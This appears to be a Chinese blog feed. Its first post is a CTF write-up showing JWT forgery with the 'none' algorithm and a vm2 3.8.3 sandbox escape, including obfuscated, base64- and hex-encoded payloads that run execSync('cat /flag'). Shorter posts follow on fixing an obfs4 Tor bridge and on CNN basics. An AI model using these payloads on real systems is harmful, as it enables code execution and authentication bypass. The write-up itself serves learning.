worker.js 工作进程 app.js 应用 routes.js url路由表 package.json 依赖模块 config.js or config/ 配置文件 controllers/ 业务逻辑相关 views/ 试图模板 common/ 跟业务相关的公共模块 proxy/ 数据访问代理层 lib/ 跟业务无关的公共模块 assets/ images|scripts|styles bin/ 相关运行脚本 node_moudules/ 一般NodeJS的项目，访问app.js即可访问主文件的代码，而主要的逻辑代码在controllers/api.js中。 2、JS弱类型 弱类型即指：数据类型可以被忽略, 一个变量可以赋不同数据类型的值，也可以在不同类型的变量之间进行操作，比如空数组[]与整数1做比较，返回为true；将浮点型数作为数组的索引等等。 面对这个大潮流，JS还是要赶紧学学啊… 题目分析进入题目之后是个登录页面，没有其他按钮，那么我们看看源代码，可以看到/static/js/app.js的存在，访问之后看到提示：或许该用 koa-static 来处理静态文件，路径该怎么配置？不管了先填个根目录XD，提示static是直接映射到程序根目录的，那么应该可以直接在根目录下进行任意文件的访问，访问一下NodeJS的应用文件app.js试试，回显如下： const Koa = require('koa');const bodyParser = require('koa-bodyparser');const session = require('koa-session');const static = require('koa-static');const views = require('koa-views');const crypto = require('crypto');const { resolve } = require('path');const rest = require('./rest');const controller = require('./controller');const PORT = 3000;const app = new Koa();app.keys = [crypto.randomBytes(16).toString('hex')];global.secrets = [];app.use(static(resolve(__dirname, '.')));app.use(views(resolve(__dirname, './views'), { extension: 'pug'}));app.use(session({key: 'sses:aok', maxAge: 86400000}, app));// parse request body:app.use(bodyParser());// prepare restful serviceapp.use(rest.restify());// add controllers:app.use(controller());app.listen(PORT);console.log(`app started at port ${PORT}...`); 可以看到这里采用了NodeJS的koa框架，该框架的主要逻辑代码当然也是在/controllers/api.js中，果断读取。 访问/controllers/api.js拿到主要逻辑代码： const crypto = require('crypto');const fs = require('fs')const jwt = require('jsonwebtoken')const APIError = require('../rest').APIError;module.exports = { 'POST /api/register': async (ctx, next) =&gt; { const {username, password} = ctx.request.body; if(!username || username === 'admin'){ throw new APIError('register error', 'wrong username'); } if(global.secrets.length &gt; 100000) { global.secrets = []; } const secret = crypto.randomBytes(18).toString('hex'); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'}); ctx.rest({ token: token }); await next(); }, 'POST /api/login': async (ctx, next) =&gt; { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError('login error', 'username or password is necessary'); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) { throw new APIError('login error', 'no such secret id'); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: 'HS256'}); const status = username === user.username &amp;&amp; password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, 'GET /api/flag': async (ctx, next) =&gt; { if(ctx.session.username !== 'admin'){ throw new APIError('permission error', 'permission denied'); } const flag = fs.readFileSync('/flag').toString(); ctx.rest({ flag }); await next(); }, 'GET /api/logout': async (ctx, next) =&gt; { ctx.session.username = null; ctx.rest({ status: true }) await next(); }}; 分析代码可知，主要包含三个路由：/api/register进行注册、/api/login进行登录，/api/flag读取flag，来分析一下代码逻辑。 首先是register路由：实现了注册账户的功能，通过接受传入的username和password，判断username不为admin之后，随机生成一个secret并为其分配一个secretid作为其在数组中的索引，然后利用secretid、username、 password、secret作为内容选用HS256进行加密，生成一个JWT令牌，此时secret也已经存入全局数组。 login路由：对username检测之后，对登录状态的token进行了拼接，然后从其中提取了secretid的值作为索引去数组中读取secret的值，用该值对token进行验证，通过验证之后，将登录时的username赋值给session中的username。 flag路由：判断username为admin之后，即打印flag。 至此，解题的思路也就很明确了，我们首先在注册账户时想办法伪造JWT为admin身份，然后用admin账户登录，即可拿到flag。 解题关键点关键点就在于如何伪造JWT，代码中生成JWT令牌时采用的时HS256算法，并且secret时随机生成并存入数组中的，爆破怕是很难爆破出来，那就要想别的办法。这里用到的方法是利用none加密算法来伪造，原理如下： 当加密时使用的是none算法，并且秘钥的值为undefined或空的时候，在验证时，即便后面的算法设置为 HS256，验证也还是按照none来进行并且通过验证。 造成这个漏洞的原因在于：这里验证的时候options选用的是algorithm，而依赖库中正确的是algorithms，正是这个原因造成了上面的漏洞。 我们知道，这个题中在验证token的时候，选用了HS256算法对(token, secret)进行了验证，那么我们如果利用上面的方法去伪造一个用户名为admin、secret为空的JWT，那应该就能伪造成admin身份读取到flag了，不过还有个问题： 我们伪造的JWT中的secretid要满足sid !== undefined、sid !== null、(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0) == true 那么就对我们伪造JWT时的secretid提出了较大的调整，不过问题不大，我们前面不是提到了JS的弱类型了嘛，其实我们传一个空数组[]、传一个浮点数0.1等等这些都是可以的啊，空口无凭，让我们实践出真知。 实操访问register进行注册，返回了一个JWT令牌，解码看其中看其中内容： 嗯…没毛病，让我们来伪造JWT吧： import jwttoken = jwt.encode({\"secretid\":[],\"username\": \"admin\",\"password\": \"admin\",\"iat\": 1587472023},algorithm=\"none\",key=\"\").decode(encoding='utf-8')print(token) 得到伪造的JWT： eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluIiwiaWF0IjoxNTg3NDcyMDIzfQ. 然后拿着我们的令牌去登录，登录时在authorization填入伪造的JWT，注意登陆的username和password要与伪造的JWT里的一样（这里我们前面是已经用test/test进行注册了，也就是说已经初始化了secrets数组，这样也更不会造成逻辑上的问题） 可以看到，此时的status为true，记下此时的sses:aok和sses:aok.sig，这个session中的username值其实已经赋值为admin了，也就是说，这个session是admin登录的session，拿着它就可以读取flag。 最后，我们去访问/api/flag路由，将记录下的token进行替换，即可伪造为admin身份拿到flag： 拿到flag，撒花~ JustEscape考察vm2沙箱逃逸、JS模板字符串以及对字符串过滤的集中绕过方式 知识补充JS模板字符串： 模板字符串使用反引号` 来代替普通字符串中的用双引号和单引号。模板字符串可以包含特定语法（'${expression}'注意是单引号）的占位符。占位符中的表达式和周围的文本会一起传递给一个默认函数，该函数负责将所有的部分连接起来，如果一个模板字符串由表达式开头，则该字符串被称为带标签的模板字符串，该表达式通常是一个函数，它会在模板字符串处理后被调用，在输出最终结果前，你都可以通过该函数来对模板字符串进行操作处理。在模版字符串内使用反引号时，需要在它前面加转义符（\\）。 题目分析根据题目的提示，可以执行一些代码，这样的话岂不是直接eval就行了？但是题目提示真的是PHP嘛，emmm…假的吧，这里学到骚姿势，用Error().stack返回报错信息，来看后端采用的架构： 可以看到后端是一个JS的VM2沙箱，进一步测试发现' &quot; +都被ban掉了，不过利用现有的逃逸方法即可进行逃逸：VM2(3.8.3)逃逸exp 但是除了前面提到的被ban的字符外，很多函数，比如：process、exec、eval等也都被过滤了，触发黑名单就会赠送一个键盘： 这里可以通过利用字符串拼接和数组调用（对象的方法或者属性名关键字被过滤的情况下可以把对象当成一个数组，然后数组里面的键名用字符串拼接出来）的方式来绕过关键字的限制，但是这里单、双引号都被ban了，直接进行字符串的拼接肯定是不行，不过可以利用反引号来代替单引号，同时利用模板字符串嵌套来拼接出需要的字符串。 比如： `${`${`proces`}s`}` 输出process 利用此方法对字符串进行拼接即可绕过过滤，对前面提到的exp进行改进即可成功逃逸。 另一种绕过方法是利用base64、hex编码进行绕过，不过都是在上面的逃逸exp基础上编码进行进一步绕过的方法。 解题方法一：利用模板字符串嵌套绕过 改进的exp如下： (function (){ TypeError[`${`${`prototyp`}e`}`][`${`${`get_pro`}cess`}`] = f=&gt;f[`${`${`constructo`}r`}`](`${`${`return proc`}ess`}`)(); try{ Object.preventExtensions(Buffer.from(``)).a = 1; }catch(e){ return e[`${`${`get_pro`}cess`}`](()=&gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString(); }})() 直接将上面的payload填入hackbar的URL栏执行即可： 方法二：利用base64/hex编码绕过 首先贴一下逃逸的exp： TypeError.prototype.get_process = f =&gt; f.constructor(\"return process\")();try { Object.preventExtensions(Buffer.from(\"\")).a = 1;} catch (e) { e.get_process(() =&gt; { }).mainModule.require(\"child_process\").execSync(\"cat /flag\").toString();} 对前面的exp进行编码，进一步绕过过滤 base64编码payload： global[[`eva`,%20`l`].join(``)](Buffer.from(`VHlwZUVycm9yLnByb3RvdHlwZS5nZXRfcHJvY2VzcyA9IGYgPT4gZi5jb25zdHJ1Y3RvcigicmV0dXJuIHByb2Nlc3MiKSgpOwp0cnkgewogICAgT2JqZWN0LnByZXZlbnRFeHRlbnNpb25zKEJ1ZmZlci5mcm9tKCIiKSkuYSA9IDE7Cn0gY2F0Y2ggKGUpIHsKICAgIGUuZ2V0X3Byb2Nlc3MoKCkgPT4geyB9KS5tYWluTW9kdWxlLnJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjU3luYygiY2F0IC9mbGFnIikudG9TdHJpbmcoKTsKfQ==`,%20`base64`).toString(`ascii`)); hex编码payload： (function(){TypeError[String.fromCharCode(112,114,111,116,111,116,121,112,101)][`\\x67\\x65\\x74\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`] = f=&gt;f[`\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72`](`\\x72\\x65\\x74\\x75\\x72\\x6e\\x20\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`)();try{Object.preventExtensions(Buffer.from(``)).a = 1;}catch(e){return e[`\\x67\\x65\\x74\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`](()=&gt;{}).mainModule.require((`\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`))[`\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63`](`cat /flag`).toString();}})() 执行结果： 小结一下这两道题对逐步学习JS还是很有用滴，不过也恐慌了，感觉又啥也不会了😅 参考：赵师傅的超详细题解VM2(3.8.3)逃逸expJS模板字符串嵌套","link":"/2020/04/21/%E8%99%8E%E7%AC%A6CTF%E5%A4%8D%E7%8E%B0/"},{"title":"obfs4网桥问题的处理","text":"昨天的问题上午刚解决，结果又有新问题… 不过这问题网上好像还有人问了，但是貌似没什么解决方案，还有人说是obfs4的一个bug，着实让我抓狂，感觉是全网第一个解决的人，起码应该是第一篇解决的文章。惬意~🤣 报错问题上午成功编译obfs4项目之后，随后就对/etc/tor/torrc文件做了如下的配置： Log notice file /var/log/tor/notices.logRunAsDaemon 1ORPort 44443 #注意这个端口官方提供配置是443，不过443可能被占用导致tor启动失败，改一下就行Exitpolicy reject *:*BridgeRelay 1ServerTransportPlugin obfs4 exec /usr/local/bin/obfs4proxyExtORPort autoPublishServerDescriptor 0 然后重启tor服务：service tor restart，查看一下tor的运行状态是没问题，嗯，放心了。 然后tail -F /var/log/tor/notices.log，原本以为没问题，但是回显结果如下： 没错，报了如下错误： [warn] Could not launch managed proxy executable at '/usr/local/bin/obfs4proxy' ('Permission denied'). 而成功的回显呢？ 没错，是上面这种情况 然后就疯狂科学上网找解决方式，说是什么要以托管的方式运行，但是就是一直解决不了… 发现猫腻是在多次尝试中，发现了疑似问题的多次restart服务，发现tor服务都正常，当时当终端直接键入tor去运行的时候，就会报错，嗯？？？ 不知道是端口占用还是进程没被杀死，但是这应该就是问题所在了，因为终端键入tor其实是执行tor这个程序，而restart是对tor服务的操作，服务成功运行不代表着tor启动了呀，tor不启动，那就不是以托管方式去运行obfs4proxy了呀，所有这就是问题！ 解决问题由于最初是yum安装的tor，尝试重装无果，便选择了自己下载源码编译。 编译、安装完成之后，对/usr/local/etc/tor下的torrc进行前面提到的配置，然后执行可执行程序，在/usr/local/bin中。 以命令./tor;tail -F /var/log/tor/notices.log同时启动tor和网桥，回显如下： good! 成功解决。","link":"/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/"},{"title":"卷积神经网络CNN入门","text":"本文主要是记录一下对卷积神经网络（CNN）的学习，这是在机器学习，具体来说是深度学习中的第一步，认真学习、好好记录。 CNN曾经被AlphaGo的开发团队用于其开发，从而也一度引起业内人士的青睐，不过有些时候会出现对CNN的盲目崇拜，比如你面试的时候，对面可能会问：你做过机器学习吗？你为什么没有采用CNN算法呢？这可能让人无法回答，其实CNN虽然相对于深度神经网络（DNN）更加简便，效能也很好，不过CNN只是用于图像处理，或者具有与图像处理要素相当的一些问题的处理中，就比如AlphaGo的下围棋，其实就相当于把棋盘当做了图像来进行处理，因此，如果你需要利用神经网络实现某些项目，一定要考虑好它具备与图像处理相当的要素没有。 这里提供一个比较好的学习视频，是李宏毅老师的教学视频。好了，下面进入学习记录了。 卷积神经网络概述卷积神经网络，是深度学习算法应用最成功的领域之一，卷积神经网络包括一维卷积神经网络，二维卷积神经网络以及三维卷积神经网络。一维卷积神经网络主要用于序列类的数据处理，二维卷积神经网络常应用于图像类文本的识别，三维卷积神经网络主要应用于医学图像以及视频类数据识别。 其结构模型如下： 与常规神经网络不同，卷积神经网络的各层中的神经元是3维排列的：宽度、高度和深度。其中的宽度和高度是很好理解的，因为本身卷积就是一个二维模板，但是在卷积神经网络中的深度指的是激活数据体的第三个维度，而不是整个网络的深度，整个网络的深度指的是网络的层数。 卷积神经网络层次卷积神经网络主要由这几类层构成：输入层、卷积层，ReLU层、池化（Pooling）层(有时也称降采样、下采样层)和全连接层（全连接层和常规神经网络中的一样）。通过将这些层叠加起来，就可以构建一个完整的卷积神经网络，如下图： 各层的主要作用如下： 输入层：用于数据的输入； 卷积层：使用卷积核进行特征提取和特征映射； 池化层：进行下采样，对特征图稀疏处理，减少数据运算量； 激励层：由于卷积也是一种线性运算，因此需要增加非线性映射； 全连接层：通常在CNN的尾部进行重新拟合，减少特征信息的损失。 输入层该层除了输入数据，还会对数据进行一些预处理，包括：去均值、归一化、PCA、白化 PCA：是指通过抛弃携带信息量较少的维度，保留主要的特征信J自，来对数据进行降维处理，思路上是使用少数几个有代表性、互不相关的特征来代替原先的..k量的、存在一定相关性的特征，从而加速机器学习进程。PCA可用于特征提取，数据压缩，去噪声，降维等操作。 白化：目的是去掉数据之间的相关联度和令方差均一化，由于图像中相邻像素之间具有很强的相关性，所以用于训练时很多输入是冗余的。这时候去相关的操作就可以采用自化操作，从而使得： 1、减少特征之间的相关性 2、特征具有相同的方差 卷积层卷积层是构建卷积神经网络的核心层，因此该层也是学习的重点。它产生了网络中大部分的计算量，注意是计算量而不是参数量。 卷积层的作用 主要有三点： 滤波器的作用或者说是卷积的作用 卷积层的参数是有一些可学习的滤波器（Filter）集合构成的。每个滤波器在空间上（宽度和高度）都比较小，但是深度和输入数据一致。直观地来说，网络会让滤波器学习到当它看到某些类型的视觉特征时就激活，具体的视觉特征可能是某些方位上的边界，或者在第一层上某些颜色的斑点，甚至可以是网络更高层上的蜂巢状、车轮状的图案。 可以看做神经元的一个输出 神经元只观察输入数据中的一小部分，并且和空间上左右两边的所有神经元共享参数（因为这些数字都是使用同一个滤波器得到的结果）。 减少参数数量 这个由于卷积具有“权值共享”这样的特性，可以降低参数数量，达到降低计算开销，防止由于参数过多而造成过拟合。 感受野 在处理图像这样的高维度输入时，让每个神经元都与前一层中的所有神经元进行全连接是不现实的。而是让每个神经元只与输入数据的一个局部区域连接，该连接的空间大小叫做神经元的感受野（receptive field），它的尺寸是一个超参数（滤波器的空间尺寸）。注意：在深度方向上，这个连接的大小总是和输入的深度相等。 神经元的空间排列 感受野讲解了卷积层中每个神经元与输入数据体之间的连接方式，但是尚未讨论输出数据体中神经元的数量，以及它们的排列方式。3个超参数控制着输出数据体的尺寸：深度（depth），步长（stride）和零填充（zero-padding）： 深度：一个超参数，和使用的滤波器的数量一致，而每个滤波器在输入数据中寻找一些不同的东西，即图像的某些特征。 步长：在滑动滤波器的时候，必须指定步长。当步长为1，滤波器每次移动1个像素；当步长为2，滤波器滑动时每次移动2个像素，依次类推。这个操作会让输出数据体在空间上变小。 零填充：有时候将输入数据体用0在边缘处进行填充是很方便的。零填充的尺寸是一个超参数。它具有一个良好性质，即可以控制输出数据体的空间尺寸（最常用的是用来保持输入数据体在空间上的尺寸，使得输入和输出的宽高都相等）。 输出数据体在空间上的尺寸 W2*H2*D2可以通过输入数据体尺寸W1*H1*D1、卷积层中神经元的感受野尺寸F、步长S、滤波器数量K和零填充的数量P计算输出出来： 注意这些空间排列的超参数之间是相互限制的。举例说来，当输入尺寸W=10，不使用零填充P=0，滤波器尺寸 F=3，此时步长S=2是行不通，因为(W-F+2P)/S+1=(10-3+0)/2+1=4.5，结果不是整数，这就是说神经元不能整齐对称地滑过输入数据体。因此，这些超参数的设定就被认为是无效的，一个卷积神经网络库可能会报出一个错误，通过修改零填充值、修改输入数据体尺寸，或者其他什么措施来让设置合理。合理地设置网络的尺寸让所有的维度都能正常工作，是相当让人头痛的事，而使用零填充和遵守其他一些设计策略将会有效解决这个问题。 权值共享 在卷积层中权值共享是用来控制参数的数量。假如在一个卷积核中，每一个感受野采用的都是不同的权重值（卷积核的值不同），那么这样的网络中参数数量将是十分巨大的。 权值共享是基于这样的一个合理的假设：如果一个特征在计算某个空间位置(x1,y1)(x1,y1)的时候有用，那么它在计算另一个不同位置(x2,y2)(x2,y2)的时候也有用。基于这个假设，可以显著地减少参数数量。换言之，就是将深度维度上一个单独的2维切片看做深度切片（depth slice），比如一个数据体尺寸为[55x55x96]的就有96个深度切片，每个尺寸为[55x55]，其中在每个深度切片上的结果都使用同样的权重和偏差获得的。在这样的参数共享下，假如一个例子中的第一个卷积层有96个卷积核，那么就有96个不同的权重集了，一个权重集对应一个深度切片，如果卷积核的大小是11x11的，图像是RGB3通道的，那么就共有96x11x11x3=34,848个不同的权重，总共有34,944个参数（因为要+96个偏差），并且在每个深度切片中的55x55的结果使用的都是同样的参数。 在反向传播的时候，都要计算每个神经元对它的权重的梯度，但是需要把同一个深度切片上的所有神经元对权重的梯度累加，这样就得到了对共享权重的梯度。这样，每个切片只更新一个权重集。原理如下图： 如上两图所示，左侧的神经元是将每一个感受野展开为一列之后串联起来（就是展开排成一列，同一层神经元之间不连接）。右侧的Deep1i是深度为1的神经元的第i个，Deep2i是深度为2的神经元的第i个，同一个深度的神经元的权值都是相同的，黄色的都是相同的（上面4个与下面4个的参数相同），蓝色也都是相同的。 所以现在回过头来看上面说的卷积神经网络的反向传播公式对梯度进行累加求和也是基于这点考虑（同一深度的不同神经元共用一组参数，所以累加）；而每个切片只更新一个权重集的原因也是这样的，因为从图中可以看到，不同深度的神经元不会公用相同的权重，所以只能更新一个权重集。 注意：如果在一个深度切片中的所有权重都使用同一个权重向量，那么卷积层的前向传播在每个深度切片中可以看做是在计算神经元权重和输入数据体的卷积（这就是“卷积层”名字由来）。这也是为什么总是将这些权重集合称为滤波器（或卷积核（kernel）），因为它们和输入进行了卷积。 注意：有时候参数共享假设可能没有意义，特别是当卷积神经网络的输入图像是一些明确的中心结构时候。这时候我们就应该期望在图片的不同位置学习到完全不同的特征（而一个卷积核滑动地与图像做卷积都是在学习相同的特征）。一个具体的例子就是输入图像是人脸，人脸一般都处于图片中心，而我们期望在不同的位置学习到不同的特征，比如眼睛特征或者头发特征可能（也应该）会在图片的不同位置被学习。在这个例子中，通常就放松参数共享的限制，将层称为局部连接层（Locally-Connected Layer）。 卷积层的超参数及选择 由于参数共享，每个滤波器包含F*F*D1个权重，卷积层一共有F*F*D1*K个权重和K个偏移。在输出数据体中，第d个深度切片（空间尺寸是W2*H2），用第d个滤波器和输入数据进行有效卷积运算的结果（使用步长S），最后在加上第d个偏差。 对这些超参数，常见的设置是F=3，S=1，P=1，F=3，S=1，P=1。 卷积层演示 因为3D数据难以可视化，所以所有的数据（输入数据体是蓝色，权重数据体是红色，输出数据体是绿色）都采取将深度切片按照列的方式排列展现。输入数据体的尺寸是W1=5，H1=5，D1=3，W1=5，H1=5，D1=3，卷积层参数K=2，F=3，S=2，P=1，K=2，F=3，S=2，P=1。就是说，有2个滤波器，滤波器的尺寸是3*33*3，它们的步长是2。因此，输出数据体的空间尺寸是(5−3+2)/2+1=3(5−3+2)/2+1=3。注意输入数据体使用了零填充P=1，所以输入数据体外边缘一圈都是0。下面的例子在绿色的输出激活数据上循环演示，展示了其中每个元素都是先通过蓝色的输入数据和红色的滤波器逐元素相乘，然后求其总和，最后加上偏差得来。 卷积操作形式 卷积操作的形式比较多，这里主要介绍三点：矩阵乘法实现卷积、1*1卷积、扩张卷积。 用矩阵乘法实现卷积 卷积运算本质上就是在滤波器和输入数据的局部区域间做点积。卷积层的常用实现方式就是利用这一点，将卷积层的前向传播变成一个巨大的矩阵乘法。 (1) 输入图像的局部区域被im2coim2col操作拉伸为列。比如输入是[227x227x3]，要与尺寸为11x11x3的滤波器以步长为4进行卷积，就依次取输入中的[11x11x3]数据块，然后将其拉伸为长度为11x11x3=363的列向量。重复进行这一过程，因为步长为4 ，所以经过卷积后的宽和高均为(227-11)/4+1=55，共有55x55=3,025个神经元。因为每一个神经元实际上都是对应有363的列向量构成的感受野，即一共要从输入上取出3025个363维的列向量。所以经过im2col操作得到的输出矩阵的尺寸是[363x3025]，其中每列是拉伸的感受野。注意因为感受野之间有重叠，所以输入数据体中的数字在不同的列中可能有重复。 (2) 卷积层的权重也同样被拉伸成行。举例：如果有96个尺寸为[11x11x3]的滤波器，就生成一个矩阵，尺寸为[96x363]。 (3) 现在卷积的结果和进行一个大矩阵乘法np.dot(Wrow,Xcol)np.dot(Wrow,Xcol)是等价的了，能得到每个滤波器和每个感受野间的点积。在我们的例子中，这个操作的输出是[96x3025]，给出了每个滤波器在每个位置的点积输出。注意其中的np.dotnp.dot计算的是矩阵乘法而不是点积。 (4) 结果最后必须被重新变为合理的输出尺寸[55x55x96]。 这个方法的缺点就是占用内存太多，因为在输入数据体中的某些值在XcolXcol中被复制了多次；优点在于矩阵乘法有非常多的高效底层实现方式。 1*1卷积 具有信号处理专业知识的人刚开始看见这个1*1卷积的时候可能会比较困惑，因为信号是2维的，所以1*1卷积就没有意义。但是，在卷积神经网络中不是这样，因为这里是对3个维度进行操作，滤波器和输入数据体的深度是一样的。比如，如果输入是[32x32x3]，那么1*1卷积就是在高效地进行3维点积（因为输入深度是3个通道）；另外的一种想法是将这种卷积的结果看作是全连接层的一种实现方式，后面讲到全连接层会提到。 扩张卷积 我们前面提到的滤波器都是连续的，但是，让滤波器中元素之间有间隙也是可以的，这就叫做扩张，如图： 在某些设置中，扩张卷积与正常卷积结合起来非常有用，因为这可以在很少的层数内更快地汇集输入图片的大尺度特征。比如，如果上下重叠2个3*3的卷积层，那么第二个卷积层的神经元的感受野是输入数据体中5*5的区域（可以称这些神经元的有效感受野是5*5）。如果我们对卷积进行扩张，那么这个有效感受野就会迅速增长。 至此，对卷积层的学习告一段落，下一层是池化层。 ReLU层也称线性整流层（Rectified Linear Units layer, ReLU layer），使用线性整流函数（Rectified Linear Units, ReLU）f(x)=max(0,x)作为这一层神经的激励函数（Activation function）。它可以增强判定函数和整个神经网络的非线性特性，而本身并不会改变卷积层。 事实上，其他的一些函数也可以用于增强网络的非线性特性，如双曲正切函数 f(x)=tanh(x)、f(x)=|tanh(x)|，或者Sigmoid函数f(x)=(1+e^(-x))^(-1)。相比其它函数来说，ReLU函数更受青睐，这是因为它可以将神经网络的训练速度提升数倍，而并不会对模型的泛化准确度造成显著影响。 池化层通常在连续的卷积层之间会周期性地插入一个池化层（Pooling），它的作用是逐渐降低数据体的空间尺寸，这样的话就能减少网络中参数的数量，使得计算资源耗费变少，也能有效控制过拟合。如下图： 池化层使用MAX操作，对输入数据体的每一个深度切片独立进行操作，改变它的空间尺寸。最常见的形式是使用尺寸2*2的滤波器，以步长为2来对每个深度切片进行降采样，将其中75%的激活信息都丢掉。每个MAX操作是从4个数字中取最大值（也就是在深度切片中某个2*2的区域），深度保持不变。 池化层的计算：输入数据体尺寸W1*H1*D1，有两个超参数：空间大小F和步长S；输出数据体的尺寸W2*H2*D2，其中： 这里面与之前的卷积的尺寸计算的区别主要在于两点：首先在池化的过程中基本不会进行另补充；其次池化前后深度不变。 普通池化（General Pooling）：除了常用的最大池化，池化单元还可以使用其他的函数，比如平均池化（average pooling）或L-2范式池化（L2-norm pooling）。平均池化历史上比较常用，但是现在已经很少使用了。因为实践证明，最大池化的效果比平均池化要好。 反向传播：回顾一下反向传播的内容，其中max(x,y)函数的反向传播可以简单理解为将梯度只沿最大的数回传。因此，在向前传播经过汇聚层的时候，通常会把池中最大元素的索引记录下来（有时这个也叫作道岔（switches）），这样在反向传播的时候梯度的路由就很高效。 不使用池化层：有些时候，被当做图像处理的问题其实也并不完全等同于图像处理，比如AlphaGo的下围棋：棋盘是不能摘除一部分位置进行缩小的，因此也就不能进行池化，事实上AlphaGo也并没有采用池化层。通过在卷积层中使用更大的步长来降低数据体的尺寸。有发现认为有时候，在训练一个良好的生成模型时，弃用汇聚层也是很重要的。比如变化自编码器（VAEs：variational autoencoders）和生成性对抗网络（GANs：generative adversarial networks）。未来的卷积网络结构中，池化层的发展还真不能确定。 全连接层全连接层（简称FC）将每一个结点都与上一层的所有结点相连，用来把前边提取到的特征综合起来。全连接层可以整合卷积层或者池化层中具有类别区分性的局部信息。 为了提升 CNN 网络性能，全连接层每个神经元的激励函数一般采用ReLU函数。最后一层全连接层的输出值被传递给一个输出，可以采用softmax逻辑回归（softmax regression）进行分类，该层也可称为softmax层（softmax laye）。 将卷积层转化为全连接层 对于任一个卷积层，都存在一个能实现和它一样的前向传播函数的全连接层。该全连接层的权重是一个巨大的矩阵，除了某些特定块（感受野），其余部分都是0；而在非0部分中，大部分元素都是相等的（权值共享）。如果把全连接层转化成卷积层，以输出层的Deep11为例，与它有关的输入神经元只有上面四个，所以在权重矩阵中与它相乘的元素，除了它所对应的4个，剩下的均为0，这也就解释了为什么权重矩阵中有为零的部分。另外要把“将全连接层转化成卷积层”和“用矩阵乘法实现卷积”区别开，这两者是不同的，后者本身还是在计算卷积，只不过将其展开为矩阵相乘的形式，并不是”将全连接层转化成卷积层”，所以除非权重中本身有零，否则用矩阵乘法实现卷积的过程中不会出现值为0的权重。 将全连接层转化为卷积层 任何全连接层都可以被转化为卷积层。比如，一个K=4096的全连接层，输入数据体的尺寸是 7*7*5127*7*512，这个全连接层可以被等效地看做一个F=7，P=0，S=1，K=4096，F=7，P=0，S=1，K=4096的卷积层。换句话说，就是将滤波器的尺寸设置为和输入数据体的尺寸设为一致的。因为只有一个单独的深度列覆盖并滑过输入数据体，所以输出将变成1*1*40961*1*4096，这个结果就和使用初始的那个全连接层一样了。这个实际上也很好理解，因为，对于其中的一个卷积滤波器，这个滤波器的的深度为512，也就是说，虽然这个卷积滤波器的输出只有1个，但是它的权重有7*7*5127*7*512，相当于卷积滤波器的输出为一个神经元，这个神经元与上一层的所有神经元相连接，而这样与前一层所有神经元相连接的神经元一共有4096个，这不就是一个全连接网络。 在上述的两种变换中，将全连接层转化为卷积层在实际运用中更加有用。假设一个卷积神经网络的输入是224*224*3的图像，一系列的卷积层和汇聚层将图像数据变为尺寸为7*7*512的激活数据体（在AlexNet中就是这样，通过使用5个汇聚层来对输入数据进行空间上的降采样，每次尺寸下降一半，所以最终空间尺寸为224/2/2/2/2/2=7）。从这里可以看到，AlexNet使用了两个尺寸为4096的全连接层，最后一个有1000个神经元的全连接层用于计算分类评分。我们可以将这3个全连接转化为3个卷积层： (1) 针对第一个连接区域是[7x7x512]的全连接层，令其滤波器尺寸为F=7，这样输出数据体就为[1x1x4096]了。 (2) 针对第二个全连接层，令其滤波器尺寸为F=1，这样输出数据体为[1x1x4096]。 (3) 对最后一个全连接层也做类似的，令其F=1，最终输出为[1x1x1000]。 这样做的目的是让卷积网络在一张更大的输入图片上滑动，得到多个输出，这样的转化可以让我们在单个向前传播的过程中完成上述的操作。 至此，对CNN各层的学习暂时告一段落，最起码有了一定的了解。下面将对各层之间的结构进行学习。 卷积神经网络结构特点卷积神经网络通常是由三种层构成：卷积层，池化层（除非特别说明，一般就是最大值池化）和全连接层。ReLU层通常在卷积层之后，它逐元素地进行激活函数操作，常常将它与卷积层看作是同一层。 层的排列规律卷积神经网络最常见的形式就是将一些卷积层和ReLU层放在一起，其后紧跟池化层，然后重复如此直到图像在空间上被缩小到一个足够小的尺寸，在某个地方过渡成成全连接层也较为常见。最后的全连接层得到输出，比如分类评分等。换句话说，最常见的卷积神经网络结构如下： 其中*指的是重复次数，POOL?指的是一个可选的池化层。其中N&gt;=0,通常N&lt;=3，M&gt;=0，K&gt;=0，K&lt;3。例如，下面是一些常见的网络结构规律： INPUT -&gt; FC ：实现一个线性分类器，此处N = M = K = 0； INPUT -&gt; CONV -&gt; RELU -&gt; FC：单层的卷积神经网络； INPUT -&gt; [CONV -&gt; RELU -&gt; POOL]*2 -&gt; FC -&gt; RELU -&gt; FC：此处在每个汇聚层之间有一个卷积层，这种网络就是简单的多层的卷积神经网络； INPUT -&gt; [CONV -&gt; RELU -&gt; CONV -&gt; RELU -&gt; POOL]*3 -&gt; [FC -&gt; RELU]*2 -&gt; FC：此处每个汇聚层前有两个卷积层，这个思路适用于更大更深的网络，因为在执行具有破坏性的汇聚操作前，多重的卷积层可以从输入数据中学习到更多的复杂特征。 